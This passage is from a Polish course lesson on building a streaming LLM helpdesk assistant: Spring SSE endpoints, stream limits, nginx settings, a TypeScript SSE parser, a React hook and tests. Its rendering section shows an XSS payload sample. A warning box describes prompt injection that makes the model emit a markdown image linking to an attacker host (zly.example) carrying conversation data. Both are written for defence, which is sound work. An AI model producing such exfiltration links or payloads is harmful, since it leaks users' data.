+<p>Słabe ogniwa: wykrycie w Tomcacie wymaga zapisu (stąd heartbeat; najgorzej 15 s płacenia za nieczytane tokeny). <code>Mono.fromCallable</code> nie przerywa wątku, więc rozpoczęte narzędzie się dokończy, ale kolejna runda nie wystartuje; przy narzędziach zapisu (moduł 3) to wymaga idempotencji (3.5). LiteLLM przy rozłączeniu zamyka strumień do dostawcy, a rozliczenie obejmuje tokeny wygenerowane do tej chwili; zachowanie zmieniało się między wersjami, więc sprawdź raz w logach kosztów LiteLLM po zatrzymaniu odpowiedzi po 2 s. Wyjątki „Broken pipe” przy zapisie (Spring 6.1+: <code>AsyncRequestNotUsableException</code>) to normalny ruch, nie podpinaj pod nie alertów. Alternatywą jest generowanie odłączone od połączenia (backend kończy i zapisuje, klient pobiera z historii), wygodne dla długich zadań, ale płatne za każdą porzuconą odpowiedź; wrócimy do tego w 5.5.</p>
+<h3>Trzy rodzaje kontekstu</h3>
+<p>Kontroler biegnie na wątku Tomcata, fragmenty z modelu na wątku Reactor Netty, narzędzia na <code>boundedElastic</code>, zapis zdarzeń na executorze MVC, <code>doFinally</code> przy anulowaniu na wątku, który anulował. <code>ThreadLocal</code> jest na nich pusty albo należy do poprzedniego żądania tego wątku.</p>
+<table>
+  <tr><th>Kontekst</th><th>Źle</th><th>Dobrze</th></tr>
+  <tr><td>Użytkownik i tenant</td><td><code>SecurityContextHolder</code> w narzędziu: pusty albo z cudzym użytkownikiem (przyczyna błędu #1 z 2.2)</td><td><code>CurrentUser</code> przekazany jawnie i <code>AssistantToolContext</code> w <code>ToolContext</code> (2.1)</td></tr>
+  <tr><td>Trace i MDC</td><td>Spany narzędzi i SQL bez rodzica, logi bez <code>traceId</code></td><td><code>spring.reactor.context-propagation: auto</code> (1.4); <code>traceId</code> do <code>error</code> odczytany w <code>prepare</code></td></tr>
+  <tr><td>Transakcja</td><td>Jedna na cały strumień</td><td>Krótka per narzędzie</td></tr>
+</table>
+<p>Tryb <code>auto</code> przenosi wartości zarejestrowane jako <code>ThreadLocalAccessor</code> (obserwacja z tracingiem, a przez nią <code>traceId</code> w <dfn data-t="mdc">MDC</dfn>). Własne klucze MDC, np. <code>tenant</code>, wymagają własnego accessora (sprawdź w dokumentacji context-propagation). Test <code>AssistantTracingIT</code> z 1.4 uruchom też przez endpoint strumieniowy: spany modelu, <code>tool_call</code> i SQL mają mieć jeden <code>traceId</code>.</p>
+
+<h2>Po zakończeniu: zapis tury i limity strumieni</h2>
+<p>Lekcja 2.5 zapisze rozmowy w <code>assistant_messages</code>, a 2.6 koszty w <code>llm_usage</code>. Obie potrzebują końca strumienia z dowolnej przyczyny. <code>doOnComplete</code> nie wywoła się przy błędzie ani anulowaniu; <code>doFinally</code> zawsze, z <code>SignalType</code> (<code>ON_COMPLETE</code>, <code>ON_ERROR</code>, <code>CANCEL</code>). Stan zbiera <code>StreamState.record</code> w <code>doOnNext</code> (tekst, moment pierwszej <code>delta</code>, ostatnie zdarzenie, tokeny; metody <code>@Synchronized</code>, bo anulowanie przychodzi na innym wątku).</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/stream/CompletedTurn.kt">
+  enum class StreamOutcome { COMPLETED, TRUNCATED, FILTERED, CANCELLED, TIMEOUT, ERROR }
+
+  data class CompletedTurn(
+      val conversationId: UUID, val tenantId: UUID, val userId: UUID,
+      val userMessage: String, val answer: String,                    // FILTERED: pusty, tylko znacznik
+      val outcome: StreamOutcome, val finishReason: FinishReason?, val toolCalls: List<ToolCallSummary>,
+      val inputTokens: Int, val outputTokens: Int, val modelAlias: String, val promptVersion: String,
+      val ttftMs: Long?, val durationMs: Long,
+  )
+
+  /** Implementują: ConversationStore (2.5), UsageRecorder (2.6). */
+  fun interface AssistantTurnListener { fun onTurnFinished(turn: CompletedTurn) }
+
+  private fun finishTurn(s: StreamState, signal: SignalType, permit: StreamPermit) {
+      permit.close()
+      val turn = s.toTurn(signal, clock.millis())   // CANCEL → CANCELLED; Done(LENGTH) → TRUNCATED; Error(TIMEOUT) → TIMEOUT…
+      metrics.record(turn)                          // helpdesk.assistant.ttft, licznik z tagiem outcome
+      Schedulers.boundedElastic().schedule {        // zapis do bazy blokuje, a doFinally bywa na wątku Netty
+          listeners.forEach { l ->
+              runCatching { l.onTurnFinished(turn) }.onFailure { log.error("Nie zapisano tury {}", turn.conversationId, it) }
+          }
+      }
+  }
+</script>
+<p>TTFT liczymy od przyjęcia żądania do pierwszej <code>delta</code>, tak jak odczuwa to użytkownik, łącznie z rundami narzędzi. Tagi metryk mają niską <dfn data-t="cardinality">kardynalność</dfn> (<code>model</code>, <code>outcome</code>); <code>conversationId</code> tylko w trace. Co zrobić z przerwaną odpowiedzią, rozstrzyga 2.5; rozsądny start: pytanie zawsze, częściowa odpowiedź po <code>CANCELLED</code> z oznaczeniem „przerwana”, po <code>FILTERED</code> tylko znacznik.</p>
+<h3>Limit współbieżnych strumieni</h3>
+<p><code>AssistantConcurrencyGuard</code> z 1.2 trzyma semafor w bloku <code>run { }</code>, a strumień trwa dłużej niż wywołanie metody. Potrzebne jest pozwolenie pobierane przed otwarciem (odmowa jako zwykłe 429/503) i oddawane w <code>doFinally</code>. Przy okazji blokujemy dwa strumienie w jednej rozmowie: podwójne kliknięcie lub druga karta dałyby konflikt numeracji w <code>assistant_messages</code> (unikalne <code>(conversation_id, seq)</code>).</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/stream/AssistantStreamGuard.kt">
+  fun interface StreamPermit : AutoCloseable { override fun close() }
+
+  @Component
+  class AssistantStreamGuard(private val limits: AssistantStreamProperties, registry: MeterRegistry) {
+      private val global = Semaphore(limits.maxConcurrent)
+      private val perUser = ConcurrentHashMap<UUID, Int>()
+      private val busy: MutableSet<UUID> = ConcurrentHashMap.newKeySet()
+
+      init { Gauge.builder("helpdesk.assistant.streams.active") { activeStreams() }.register(registry) }
+      fun activeStreams(): Int = limits.maxConcurrent - global.availablePermits()
+
+      fun acquire(userId: UUID, conversationId: UUID): StreamPermit {
+          if (!busy.add(conversationId)) throw ConversationBusyException(conversationId)      // 409 conversation-busy
+          var counted = false
+          try {
+              counted = true
+              if (perUser.merge(userId, 1) { a, b -> a + b }!! > limits.maxPerUser) throw TooManyStreamsException()  // 429
+              if (!global.tryAcquire()) throw AssistantUnavailableException("Za dużo rozmów naraz")                   // 503
+          } catch (e: RuntimeException) {
+              busy.remove(conversationId); if (counted) decrement(userId); throw e
+          }
+          val closed = AtomicBoolean()
+          return StreamPermit {
+              if (closed.compareAndSet(false, true)) { global.release(); decrement(userId); busy.remove(conversationId) }
+          }
+      }
+
+      private fun decrement(userId: UUID) { perUser.computeIfPresent(userId) { _, n -> if (n <= 1) null else n - 1 } }
+  }
+</script>
+<p>Wyjątki mapuje handler z 1.5 rozszerzony o nowy kontroler (429 <code>assistant-too-many-streams</code>, 409 <code>conversation-busy</code>). Limit działa per instancja: przy kilku replikach ostatnią linią obrony jest unikalny indeks z 2.5, a rozproszoną blokadę da Redis albo <code>pg_try_advisory_lock</code>. Spring subskrybuje zwrócony <code>Flux</code> od razu, więc okno na niezwolnione pozwolenie jest minimalne, a <code>Gauge</code> je pokaże. 50 strumieni po średnio 8 s to ok. 6 pytań/s na instancję (prawo Little'a z 1.2), więcej niż typowy limit TPM; o przepustowości nadal decydują limiter tokenów i <dfn data-t="bulkhead">bulkhead</dfn> z 1.5, a ten limit chroni pamięć i połączenia.</p>
+
+<h2>Proxy, nginx i load balancery</h2>
+<p>Typowy objaw: lokalnie odpowiedź płynie, na środowisku testowym pojawia się w całości po 6 s. Winne jest <dfn data-t="proxy-buffering">buforowanie w proxy</dfn>: nginx domyślnie zbiera odpowiedź backendu i wysyła ją większymi porcjami. Drugi winowajca to kompresja, która zbiera dane w bloki.</p>
+<script type="text/x-code" data-lang="plaintext" data-title="nginx.conf (fragment)">
+  location /api/assistant/chat/stream {
+      proxy_pass          http://helpdesk_backend;
+      proxy_http_version  1.1;
+      proxy_set_header    Connection "";
+      proxy_buffering     off;          # zdarzenia od razu do klienta
+      proxy_cache         off;
+      gzip                off;
+      proxy_read_timeout  60s;          # maks. przerwa między odczytami; heartbeat co 15 s
+  }
+</script>
+<ul>
+  <li><strong><code>X-Accel-Buffering: no</code></strong> z kontrolera wyłącza buforowanie dla tej odpowiedzi nawet bez osobnego <code>location</code>; rozumie go nginx i ingress-nginx (tam też adnotacje <code>nginx.ingress.kubernetes.io/proxy-buffering: "off"</code> i <code>proxy-read-timeout</code>).</li>
+  <li><strong>Spring Boot <code>server.compression</code></strong>: domyślna lista typów nie zawiera <code>text/event-stream</code>; nie dopisuj go.</li>
+  <li><strong>Load balancer, CDN, WAF</strong>: timeout bezczynności (np. AWS ALB 60 s, Azure Load Balancer 4 min), ewentualny limit czasu całej odpowiedzi i buforowanie do inspekcji; sprawdź w dokumentacji swojej usługi.</li>
+  <li><strong>HTTP/1.1</strong>: przeglądarka otwiera ok. 6 połączeń na domenę, więc strumienie w kilku kartach blokują inne żądania; HTTP/2 na wejściu to rozwiązuje.</li>
+</ul>
+<script type="text/x-code" data-lang="bash" data-title="czy coś buforuje? (-N: bez buforowania w curl)">
+  curl -N -X POST https://helpdesk-test.example/api/assistant/chat/stream \
+    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -H "Accept: text/event-stream, application/problem+json" \
+    -d '{"tenantId":"0b8f6c55-0f0c-4c1e-8a7e-3f1f5d1a2b3c","message":"Opisz statusy zgłoszeń"}'
+</script>
+
+<h2>Frontend: parser SSE na fetch</h2>
+<p><code>fetch</code> zwraca <code>Response</code>, którego <code>body</code> to <code>ReadableStream&lt;Uint8Array&gt;</code>. Bajty zamienia na tekst <code>TextDecoder</code> z opcją <code>stream: true</code>, która trzyma niedokończony znak UTF-8 do następnego kawałka. Parser buforuje niepełne linie i składa zdarzenia według specyfikacji.</p>
+<script type="text/x-code" data-lang="typescript" data-title="assistant/sse.ts">
+  export interface SseMessage { event: string; data: string; id?: string }
+
+  export class SseParser {
+    private buffer = "";
+    private dataLines: string[] = [];
+    private eventType = "";
+    private lastEventId: string | undefined;
+    private started = false;
+
+    constructor(private readonly onComment?: (text: string) => void) {}
+
+    /** Przyjmuje zdekodowany kawałek, zwraca zdarzenia, które się w nim domknęły. */
+    feed(chunk: string): SseMessage[] {
+      if (!this.started && chunk.length > 0) {
+        this.started = true;
+        if (chunk.charCodeAt(0) === 0xfeff) chunk = chunk.slice(1);   // BOM tylko na początku
+      }
+      this.buffer += chunk;
+      const out: SseMessage[] = [];
+      let lineStart = 0;
+      for (let i = 0; i < this.buffer.length; i++) {
+        const ch = this.buffer[i];
+        if (ch !== "\n" && ch !== "\r") continue;
+        if (ch === "\r" && i === this.buffer.length - 1) break;       // może CRLF rozcięte między kawałkami
+        this.processLine(this.buffer.slice(lineStart, i), out);
+        if (ch === "\r" && this.buffer[i + 1] === "\n") i++;
+        lineStart = i + 1;
+      }
+      this.buffer = this.buffer.slice(lineStart);                     // niepełna linia czeka
+      return out;
+    }
+
+    private processLine(line: string, out: SseMessage[]): void {
+      if (line === "") {                                              // pusta linia kończy zdarzenie
+        if (this.dataLines.length > 0) {
+          out.push({ event: this.eventType || "message", data: this.dataLines.join("\n"), id: this.lastEventId });
+        }
+        this.dataLines = [];
+        this.eventType = "";
+        return;
+      }
+      if (line.startsWith(":")) { this.onComment?.(line.slice(1)); return; }
+      const colon = line.indexOf(":");
+      const field = colon === -1 ? line : line.slice(0, colon);
+      let value = colon === -1 ? "" : line.slice(colon + 1);
+      if (value.startsWith(" ")) value = value.slice(1);
+      if (field === "data") this.dataLines.push(value);
+      else if (field === "event") this.eventType = value;
+      else if (field === "id" && !value.includes("\0")) this.lastEventId = value;
+      // retry i nieznane pola: ignoruj
+    }
+  }
+
+  export async function* readSse(body: ReadableStream<Uint8Array>, onBytes?: () => void): AsyncGenerator<SseMessage> {
+    const reader = body.getReader();
+    const decoder = new TextDecoder("utf-8");
+    const parser = new SseParser();
+    let finished = false;
+    try {
+      for (;;) {
+        const { done, value } = await reader.read();
+        if (done) { finished = true; break; }
+        onBytes?.();
+        yield* parser.feed(decoder.decode(value, { stream: true }));
+      }
+      yield* parser.feed(decoder.decode());             // niedokończone zdarzenie przepada (specyfikacja)
+    } finally {
+      if (!finished) await reader.cancel().catch(() => {});
+      reader.releaseLock();
+    }
+  }
+</script>
+<p>Warstwa protokołu czatu jest cienka: typ <code>ChatEvent</code> w TypeScript odpowiada klasom z Kotlina (unia z polem <code>type</code>), a <code>parseChatEvent(msg)</code> zwraca <code>{ type: msg.event, ...JSON.parse(msg.data) }</code> dla pięciu znanych typów i <code>null</code> dla nieznanych lub uszkodzonych (walidację schematu da np. zod).</p>
+
+<h2>Hook useAssistantStream</h2>
+<p>Hook skupia logikę strumienia; komponent tylko renderuje. Stany: <code>idle</code>, <code>streaming</code>, <code>done</code> (także po „Zatrzymaj”, z flagą), <code>error</code>. Anulowanie realizuje <dfn data-t="abort-controller">AbortController</dfn>: jego <code>signal</code> przekazujesz do <code>fetch</code>, a <code>abort(powód)</code> przerywa żądanie i czytanie. Powód pozwala odróżnić zatrzymanie od awarii.</p>
+<script type="text/x-code" data-lang="typescript" data-title="assistant/useAssistantStream.ts">
+  type Status = "idle" | "streaming" | "done" | "error";
+  export interface StreamError { code: string; message: string; retryable: boolean; traceId?: string | null }
+  export interface StreamState {
+    status: Status; text: string; activeTool: string | null;
+    finishReason: FinishReason | null; stoppedByUser: boolean; error: StreamError | null;
+  }
+  const initial: StreamState = { status: "idle", text: "", activeTool: null, finishReason: null, stoppedByUser: false, error: null };
+  const IDLE_MS = 35_000;                                             // > 2 × heartbeat
+  const FILTERED_TEXT = "Nie mogę odpowiedzieć na to pytanie. Spróbuj je sformułować inaczej.";
+  const INTERRUPTED: StreamError = { code: "INTERRUPTED", message: "Połączenie zostało przerwane. Spróbuj ponownie.", retryable: true };
+
+  type Action = { t: "start" } | { t: "text"; chunk: string } | { t: "event"; e: ChatEvent } | { t: "fail"; error: StreamError } | { t: "stopped" };
+
+  function reducer(s: StreamState, a: Action): StreamState {
+    switch (a.t) {
+      case "start": return { ...initial, status: "streaming" };
+      case "text": return { ...s, text: s.text + a.chunk, activeTool: null };
+      case "stopped": return { ...s, status: "done", activeTool: null, stoppedByUser: true };
+      case "fail": return { ...s, status: "error", activeTool: null, error: a.error };
+      case "event": {
+        const e = a.e;
+        if (e.type === "tool") return { ...s, activeTool: e.status === "started" ? e.name : null };
+        if (e.type === "error") return { ...s, status: "error", activeTool: null, error: e };
+        if (e.type === "done") return { ...s, status: "done", activeTool: null, finishReason: e.finishReason,
+          text: e.finishReason === "CONTENT_FILTER" ? FILTERED_TEXT : s.text };   // częściowy tekst znika
+        return s;
+      }
+    }
+  }
+
+  export function useAssistantStream(tenantId: string) {
+    const { token } = useAuth();
+    const [state, dispatch] = useReducer(reducer, initial);
+    const ctrl = useRef<AbortController | null>(null);
+    const conversationId = useRef<string | null>(null);
+    const lastMessage = useRef<string | null>(null);
+    const pending = useRef("");
+    const frame = useRef<number | null>(null);
+
+    const flush = useCallback(() => {                                 // delty łączymy: max 1 render na klatkę
+      if (frame.current !== null) { cancelAnimationFrame(frame.current); frame.current = null; }
+      if (pending.current) { dispatch({ t: "text", chunk: pending.current }); pending.current = ""; }
+    }, []);
+
+    useEffect(() => () => ctrl.current?.abort("unmount"), []);
+
+    const send = useCallback(async (message: string) => {
+      if (ctrl.current) return;                                       // podwójne kliknięcie
+      const controller = new AbortController();
+      ctrl.current = controller;
+      lastMessage.current = message;
+      dispatch({ t: "start" });
+      let lastByteAt = Date.now();
+      const watchdog = setInterval(() => { if (Date.now() - lastByteAt > IDLE_MS) controller.abort("idle"); }, 5_000);
+      const onOffline = () => controller.abort("offline");
+      window.addEventListener("offline", onOffline);
+      let terminal = false;
+      try {
+        const res = await fetch("/api/assistant/chat/stream", {
+          method: "POST", signal: controller.signal,
+          headers: { "Content-Type": "application/json", Accept: "text/event-stream, application/problem+json",
+                     Authorization: `Bearer ${token}` },
+          body: JSON.stringify({ tenantId, conversationId: conversationId.current, message }),
+        });
+        if (!res.ok || !res.body) { dispatch({ t: "fail", error: await problemToError(res) }); terminal = true; return; }
+        for await (const msg of readSse(res.body, () => { lastByteAt = Date.now(); })) {
+          const e = parseChatEvent(msg);
+          if (!e) continue;
+          if (e.type === "delta") {
+            pending.current += e.text;
+            frame.current ??= requestAnimationFrame(() => { frame.current = null; flush(); });
+            continue;
+          }
+          flush();                                                    // tekst przed zdarzeniem sterującym
+          if (e.type === "meta") conversationId.current = e.conversationId;
+          dispatch({ t: "event", e });
+          if (e.type === "done" || e.type === "error") terminal = true;
+        }
+        flush();
+        if (!terminal) dispatch({ t: "fail", error: INTERRUPTED });  // koniec bez done/error = zerwanie
+      } catch {
+        flush();
+        const reason = controller.signal.aborted ? controller.signal.reason : null;
+        if (reason === "user") dispatch({ t: "stopped" });
+        else if (reason !== "unmount") dispatch({ t: "fail",
+          error: reason === "offline" ? { ...INTERRUPTED, message: "Brak połączenia z siecią." } : INTERRUPTED });
+      } finally {
+        clearInterval(watchdog);
+        window.removeEventListener("offline", onOffline);
+        if (ctrl.current === controller) ctrl.current = null;
+      }
+    }, [tenantId, token, flush]);
+
+    const stop = useCallback(() => ctrl.current?.abort("user"), []);
+    const retry = useCallback(() => { if (lastMessage.current) void send(lastMessage.current); }, [send]);
+    return { state, send, stop, retry };
+  }
+</script>
+<p><code>problemToError</code> czyta ProblemDetail: 403 z typem kończącym się na <code>/assistant-disabled</code> daje „Asystent czatu nie jest dostępny dla Twojej organizacji” bez ponowienia (Globex), 429/503/409 dają <code>detail</code> z ponowieniem. Miejsca, które łatwo zepsuć:</p>
+<ul>
+  <li><strong>Podwójne kliknięcie</strong>: sprawdzamy ref, nie <code>state.status</code>, bo dwa kliknięcia w jednej klatce widzą stary stan. Przycisk jest też wyłączony, a backend ma blokadę rozmowy (409) na wypadek drugiej karty.</li>
+  <li><strong>Render na każdy fragment</strong>: model wysyła nawet 50–100 fragmentów na sekundę; <code>requestAnimationFrame</code> daje maksymalnie jedną aktualizację na klatkę. W ukrytej karcie nie działa, dlatego <code>flush()</code> także przed zdarzeniami sterującymi i na końcu.</li>
+  <li><strong>Ponowienie robi użytkownik</strong>: automatyczne to drugie płatne pytanie i inna odpowiedź. <code>retry</code> wysyła to samo pytanie w tej samej rozmowie.</li>
+</ul>
+
+<h2>Renderowanie: markdown, a11y i telefon</h2>
+<p>Model odpowiada w markdownie, więc go renderujemy, uważając na <dfn data-t="xss">XSS</dfn> (wstrzyknięcie kodu, który wykona się w przeglądarce ofiary z jej sesją). Odpowiedź nie jest zaufana: model może powtórzyć treść zgłoszenia od atakującego, np. <code>&lt;img src=x onerror="…"&gt;</code>. Droga do katastrofy to <code>marked(text)</code> w <code>dangerouslySetInnerHTML</code> bez sanitizacji (usunięcia niebezpiecznych znaczników i atrybutów). <code>react-markdown</code> buduje elementy Reacta, a nie HTML w stringu, domyślnie nie renderuje surowego HTML i usuwa adresy <code>javascript:</code>. Dodatkowo zawężamy elementy:</p>
+<script type="text/x-code" data-lang="typescript" data-title="assistant/AnswerMarkdown.tsx">
+  const ALLOWED = ["p", "strong", "em", "ul", "ol", "li", "code", "pre", "blockquote", "br",
+                   "table", "thead", "tbody", "tr", "th", "td", "a", "h3", "h4"];       // bez img!
+
+  function SafeLink({ href, children }: ComponentProps<"a">) {          // tylko linki wewnętrzne
+    return href?.startsWith("/tickets/") ? <a href={href}>{children}</a> : <span>{children}</span>;
+  }
+
+  export const AnswerMarkdown = memo(function AnswerMarkdown({ text }: { text: string }) {
+    return (
+      <ReactMarkdown remarkPlugins={[remarkGfm]} allowedElements={ALLOWED} unwrapDisallowed skipHtml
+                     components={{ a: SafeLink }}>
+        {text}
+      </ReactMarkdown>
+    );
+  });
+</script>
+<div class="box bug"><span class="label">Wyciek przez obrazek</span><p>Prompt injection w zgłoszeniu może kazać modelowi wstawić <code>![](https://zly.example/log?d=…)</code> z danymi rozmowy w adresie. Przeglądarka pobierze „obrazek” sama, bez kliknięcia, i dane wyjdą z systemu. Dlatego bez <code>img</code>, bez linków zewnętrznych i z Content-Security-Policy <code>img-src 'self'</code>. Więcej w 3.4.</p></div>
+<p>Niedomknięty markdown w trakcie (<code>**W reali</code>) przez chwilę pokaże gwiazdki; to akceptowalne. Parsowanie całego tekstu co klatkę przy 800 tokenach to ułamki milisekundy; optymalizuj dopiero po pomiarze. Wskaźnik narzędzia mapuje nazwę na tekst: <code>getTicket</code> → „Sprawdzam zgłoszenie…”, <code>getSlaStatus</code> → „Sprawdzam termin SLA…”, nieznana → „Sprawdzam dane…”. Komponent czatu składa się z kontenera z <code>AnswerMarkdown</code>, wskaźnika narzędzia (gdy <code>activeTool</code>), notki przy <code>LENGTH</code>, bloku błędu z „Spróbuj ponownie” tylko przy <code>retryable</code> i przycisku „Zatrzymaj” w miejscu „Wyślij” podczas strumienia.</p>
+<p><strong>Dostępność.</strong> Czytniki ekranu ogłaszają zmiany w regionach <dfn data-t="aria-live">aria-live</dfn>. To atrybut oznaczający treść zmieniającą się dynamicznie. Naiwne <code>aria-live</code> na kontenerze odpowiedzi każe czytnikowi ogłaszać każdy fragment, więc przerywa sam siebie. Lepiej: kontener z <code>aria-busy</code> w trakcie strumienia i bez <code>aria-live</code>, osobny ukryty region <code>role="status"</code> z krótkimi komunikatami, błędy w <code>role="alert"</code>, „Zatrzymaj” w miejscu „Wyślij” i dostępny z klawiatury, animacja kursora wyłączona dla <code>prefers-reduced-motion</code>.</p>
+<p><strong>Telefon.</strong> Blokada ekranu zamraża kartę, a system po chwili zamyka jej połączenia; zmiana Wi-Fi na LTE zrywa TCP. Po powrocie watchdog od razu widzi ponad 35 s ciszy (albo <code>read()</code> rzuca błąd) i pokazuje częściowy tekst z „Połączenie zostało przerwane”. Zdarzenie <code>offline</code> przerywa od razu. Backend wykrywa zerwanie przy kolejnym heartbeat i zapisuje turę jako <code>CANCELLED</code>. Nie ponawiamy automatycznie; po wprowadzeniu historii (2.5) warto ją po błędzie przeładować, bo odpowiedź mogła zostać zapisana.</p>
+
+<h2>Testy i przypadki brzegowe</h2>
+<p>Backend testujemy na prawdziwym serwerze (<code>RANDOM_PORT</code>), bo tylko wtedy przechodzi cała ścieżka MVC async i zapis SSE. <code>WebTestClient</code> (klient testowy Springa z modułu WebFlux) czyta strumień, a <code>StepVerifier</code> z <code>reactor-test</code> sprawdza element po elemencie, łącznie z zakończeniem i anulowaniem. LiteLLM zastępuje WireMock (1.5) z odpowiedzią <code>text/event-stream</code> w formacie OpenAI.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/AssistantStreamIT.kt">
+  @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
+  @AutoConfigureWebTestClient
+  class AssistantStreamIT(@Autowired val client: WebTestClient, @Autowired val turns: RecordingTurnListener,
+                          @Autowired val guard: AssistantStreamGuard) {
+      // + Postgres (Testcontainers) z seedem Acme/Globex, WireMockExtension "llm" jako spring.ai.openai.base-url (1.5)
+      private val SSE = object : ParameterizedTypeReference<ServerSentEvent<String>>() {}
+      private fun sse(vararg data: String) = data.joinToString("") { "data: $it\n\n" }
+      private fun chunk(text: String?, finish: String? = null) = """{"id":"c1","object":"chat.completion.chunk",""" +
+          """"created":1,"model":"m","choices":[{"index":0,"delta":{"content":${text?.let { "\"$it\"" }}},""" +
+          """"finish_reason":${finish?.let { "\"$it\"" }}}]}"""
+
+      private fun ask(token: String, tenant: UUID) = client.post().uri("/api/assistant/chat/stream")
+          .headers { it.setBearerAuth(token) }.accept(MediaType.TEXT_EVENT_STREAM, MediaType.APPLICATION_PROBLEM_JSON)
+          .bodyValue(mapOf("tenantId" to tenant, "message" to "Status HD-1042?")).exchange()
+
+      @Test
+      fun `odpowiedz ucieta na limicie konczy sie done LENGTH`() {
+          llm.stubFor(post(CHAT).willReturn(aResponse().withHeader("Content-Type", "text/event-stream")
+              .withBody(sse(chunk("Status: "), chunk("W realizacji, a"), chunk(null, "length"), "[DONE]"))))
+          val events = ask(TestJwt.anna(), ACME).expectStatus().isOk.returnResult(SSE).responseBody
+              .filter { it.event() != null }                         // bez heartbeatu
+          StepVerifier.create(events)
+              .assertNext { assertThat(it.event()).isEqualTo("meta") }
+              .expectNextCount(2)
+              .assertNext { assertThat(it.event()).isEqualTo("done"); assertThat(it.data()).contains("\"LENGTH\"") }
+              .verifyComplete()
+      }
+
+      @Test
+      fun `Globex dostaje 403 ProblemDetail przed strumieniem i zero wywolan modelu`() {
+          ask(TestJwt.ewaGlobex(), GLOBEX).expectStatus().isForbidden
+              .expectHeader().contentTypeCompatibleWith(MediaType.APPLICATION_PROBLEM_JSON)
+              .expectBody().jsonPath("$.reason").isEqualTo("EXTERNAL_LLM_NOT_ALLOWED")
+          llm.verify(0, postRequestedFor(CHAT))
+      }
+
+      @Test
+      fun `anulowanie zwalnia limit i zapisuje ture jako CANCELLED`() {
+          llm.stubFor(post(CHAT).willReturn(aResponse().withHeader("Content-Type", "text/event-stream")
+              .withBody(sse(*Array(40) { chunk("słowo ") }, chunk(null, "stop"), "[DONE]"))
+              .withChunkedDribbleDelay(40, 8_000)))                   // powolny strumień
+          val deltas = ask(TestJwt.anna(), ACME).returnResult(SSE).responseBody.filter { it.event() == "delta" }
+          StepVerifier.create(deltas).expectNextCount(2).thenCancel().verify()
+          await().atMost(Duration.ofSeconds(20)).untilAsserted {     // wykrycie przy zapisie: delta albo ping
+              assertThat(turns.last().outcome).isEqualTo(StreamOutcome.CANCELLED)
+              assertThat(guard.activeStreams()).isZero()
+          }
+      }
+  }
+</script>
+<p>Dopisz: strumień bez <code>finish_reason</code> kończy się <code>error INTERRUPTED</code>, nie <code>done</code>; scenariusz WireMock z dwiema odpowiedziami (najpierw <code>delta.tool_calls</code> z <code>getTicket</code> i <code>finish_reason: "tool_calls"</code>, potem tekst) daje kolejność <code>meta, tool started, tool finished, delta…, done</code>, a drugie żądanie zawiera wiadomość roli <code>tool</code>; szósta prośba o narzędzie daje <code>TOOL_ROUNDS_EXCEEDED</code>; test z 2.2 (agent Piotr w rozmowie Acme pyta o HD-2077) przez strumień daje <code>tool finished</code> z <code>ok: false</code> i brak tytułu zgłoszenia Globex w odpowiedzi.</p>
+<p>Parser frontu testujemy jednostkowo w Vitest (test runner zgodny z API Jest). Najcenniejszy test: ten sam strumień pocięty w każdym możliwym miejscu daje te same zdarzenia.</p>
+<script type="text/x-code" data-lang="typescript" data-title="assistant/sse.test.ts">
+  const RAW = 'event:delta\ndata:{"text":"Zgłoszenie"}\n\n:ping\n\nevent: done\r\ndata: {"finishReason":"STOP"}\r\n\r\n';
+
+  describe("SseParser", () => {
+    it("daje te same zdarzenia przy cięciu w dowolnym miejscu", () => {
+      for (let cut = 0; cut <= RAW.length; cut++) {
+        const p = new SseParser();
+        const msgs = [...p.feed(RAW.slice(0, cut)), ...p.feed(RAW.slice(cut))];
+        expect(msgs.map(m => m.event)).toEqual(["delta", "done"]);
+      }
+    });
+    it("łączy wieloliniowe data i ignoruje niedokończone zdarzenie", () => {
+      const msgs = new SseParser().feed("data: pierwsza\ndata:druga\n\ndata: {\"te");
+      expect(msgs).toEqual([{ event: "message", data: "pierwsza\ndruga", id: undefined }]);
+    });
+  });
+
+  it("readSse skleja znak UTF-8 rozcięty między kawałkami", async () => {
+    const bytes = new TextEncoder().encode('event:delta\ndata:{"text":"łąka"}\n\n');
+    const cut = bytes.indexOf(0xc5) + 1;                              // w środku dwubajtowego „ł”
+    const body = new ReadableStream<Uint8Array>({
+      start(c) { c.enqueue(bytes.slice(0, cut)); c.enqueue(bytes.slice(cut)); c.close(); },
+    });
+    const texts: string[] = [];
+    for await (const m of readSse(body)) texts.push(JSON.parse(m.data).text);
+    expect(texts).toEqual(["łąka"]);
+  });
+</script>
+<table>
+  <tr><th>Przypadek brzegowy</th><th>Backend</th><th>Frontend</th></tr>
+  <tr><td>Globex</td><td>403 <code>assistant-disabled</code> przed strumieniem, zero tokenów</td><td>„Asystent czatu nie jest dostępny dla Twojej organizacji”, bez ponowienia</td></tr>
+  <tr><td>Zerwanie w połowie / brak <code>finish_reason</code></td><td><code>error INTERRUPTED</code> (gdy klient jeszcze słucha)</td><td>Częściowy tekst + „Spróbuj ponownie”; koniec bez <code>done</code> = przerwanie</td></tr>
+  <tr><td><code>LENGTH</code></td><td><code>done LENGTH</code>, tura <code>TRUNCATED</code></td><td>„Odpowiedź została skrócona”</td></tr>
+  <tr><td><code>CONTENT_FILTER</code> w trakcie</td><td><code>done CONTENT_FILTER</code>, w historii znacznik</td><td>Tekst zastąpiony neutralnym komunikatem</td></tr>
+  <tr><td>Podwójne kliknięcie, druga karta</td><td>409 <code>conversation-busy</code>; trzeci strumień użytkownika 429</td><td>Ref blokuje drugie wywołanie</td></tr>
+  <tr><td>Zamknięcie karty, uśpienie telefonu</td><td>Wykrycie przy heartbeat, anulowanie u dostawcy, <code>CANCELLED</code></td><td>Po powrocie: „Połączenie zostało przerwane”</td></tr>
+  <tr><td>Narzędzia w kółko</td><td>Po 5 rundach <code>TOOL_ROUNDS_EXCEEDED</code></td><td>Komunikat bez ponowienia</td></tr>
+</table>
+
+<div class="box tip"><span class="label">Ćwiczenie</span><ol>
+  <li>Zaimplementuj <code>SseParser</code> z testami i dopisz test losowy: 1000 razy potnij strumień 20 zdarzeń (polskie znaki, CRLF) na losowe kawałki bajtów i porównaj wynik z odczytem w jednym kawałku.</li>
